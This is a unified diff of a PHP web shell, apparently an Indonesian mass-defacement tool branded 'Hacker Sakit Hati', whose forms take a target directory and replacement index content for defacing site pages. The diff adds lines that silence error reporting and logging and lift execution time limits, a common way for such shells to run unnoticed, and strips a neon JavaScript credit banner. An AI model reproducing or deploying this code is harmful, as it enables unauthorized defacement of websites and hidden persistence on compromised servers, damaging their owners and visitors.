@@ -1,8 +1,13 @@
- <?php
-
-$HackerSakitHati = 
-
+<?php
 //////////////////////// general /////
+@session_start();
+@error_reporting(0);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@define('VERSION', '2.2');
   set_time_limit(0);
  $dir=$_POST['dir'];
    $index = $_POST["index"];
@@ -117,7 +122,7 @@ echo "</textarea></center>";
 
 
 ?><br><center>
-<strong>xXx ||   MAIN SABUN   || xXx <br></strong>
+<strong> xXx || MAIN SABUN || xXx <br></strong>
 <form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
 [+] Main Sabun : <input type='text' style='width: 444px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'><br>
 [+] Sabun Masal : <input type='text' style='width: 438px' name='massdefaceurl'><br>
@@ -126,7 +131,7 @@ echo "</textarea></center>";
 <div id="result">
 <form method='post'>
 <center>
-			<strong> |||||||||||||||||||||  Main Sabun Di Room - VIP  ||||||||||||||||||||| <<br></strong>
+			<strong> |||||||||||||||||||||  <blink>Main Sabun Di Kamar</blink>  ||||||||||||||||||||| <<br></strong>
 			<input name='dir' class="code" style='width: 525px' type='text' value="<? echo getcwd(); ?>"><br><br><strong>Tempat Lokasi Penyabunan<br></strong>
 			<textarea placeholder='Silahkan Menyiapkan Sabun Kesukaan Anda !! ^_^ ' class="evalcode" name='index' style='width: 520px; height: 100px; background:# ;color:black ;'></textarea><br><br>
 			<strong>Pilihan Menu Sabun<br></strong>
@@ -151,65 +156,6 @@ input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
 
  .inputzbut:hover{border:1px solid white;}
 </style>
-<title>Hacker Sakit Hati </title><center>
 <div id="result">
-<br />
-<script language="JavaScript1.2">
-var message=" ..::[+  Copyright © 2014 Hacker Sakit Hati   +]::..  "// jangan pakai enter
-var neonbasecolor=" aqua "
-var neontextcolor=" white "
-var neontextcolor2="pink"  // kode warna kedua
-var flashspeed=1	// kecepatan flash neon, semakin kecil semakin cepat
-var flashingletters=10	// jumlah huruf yang tersorot oleh flash
-var flashingletters2=2	// jumlah warna di ekor flash
-var flashpause=1					
-///edit by http://googel-indonesia.blogspot.com/
-var n=0
-if (document.all||document.getElementById){
-document.write('<font color="'+neonbasecolor+'">')
-for (m=0;m<message.length;m++)
-document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
-document.write('</font>')
-}
-else
-document.write(message)
-function crossref(number){
-var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
-return crossobj
-}
-function neon(){
-//Change all letters to base color
-if (n==0){
-for (m=0;m<message.length;m++)
-crossref(m).style.color=neonbasecolor
-}
-//cycle through and change individual letters to neon color
-crossref(n).style.color=neontextcolor
-
-if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 
-if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
-if (n<message.length-1)
-n++
-else{
-n=0
-clearInterval(flashing)
-setTimeout("beginneon()",flashpause)
-return
-}
-}
-function beginneon(){
-if (document.all||document.getElementById)
-flashing=setInterval("neon()",flashspeed)
-}
-beginneon()
-</script>
-	
-
-
-</div></center>			
-			
-			
-			
-			
-			</form>
+<br /><br /></center></form>
 </div></style></th></div></body>
